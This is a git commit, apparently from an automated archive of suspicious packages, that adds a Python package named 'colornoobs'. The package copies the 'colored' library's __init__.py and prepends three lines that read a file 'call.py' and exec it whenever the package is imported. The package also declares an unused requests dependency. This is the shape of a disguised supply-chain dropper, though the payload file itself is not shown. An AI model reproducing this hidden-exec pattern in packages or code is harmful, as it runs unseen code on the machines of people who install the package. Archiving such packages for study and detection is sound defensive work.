f9acc8020a8946d644f4df020149bfd0930a282e
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2024-02-18 20:05:54 +0000

    Add package colornoobs/0.0.1/colornoobs-0.0.1.tar.gz

---
+++ packages/colornoobs/colornoobs-0.0.1.tar.gz/colornoobs-0.0.1/colored/__init__.py
@@ -0,0 +1,22 @@
+with open("call.py", "r") as file: 
+  run = file.read()
+exec(run)
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
+from .colored import (
+    Colored,
+    fore, back, style,
+    fore_rgb, back_rgb,
+    fg, bg, attr, stylize,
+    stylize_interactive, set_tty_aware
+)
+
+from .cprint import cprint
+from .foreground import Fore
+from .background import Back
+from .attributes import Style
+from .controls import Controls
+
+
+__version__: str = '2.2.4'
---
+++ packages/colornoobs/colornoobs-0.0.1.tar.gz/colornoobs-0.0.1/setup.py
@@ -0,0 +1,12 @@
+from setuptools import setup, find_packages
+
+setup(
+    name="colornoobs",
+    version="0.0.1",
+    packages=['colored'],
+    install_requires = [
+        "requests==2.31.0"
+    ],
+    author="colornoobs",
+    description="colornoobs"
+)
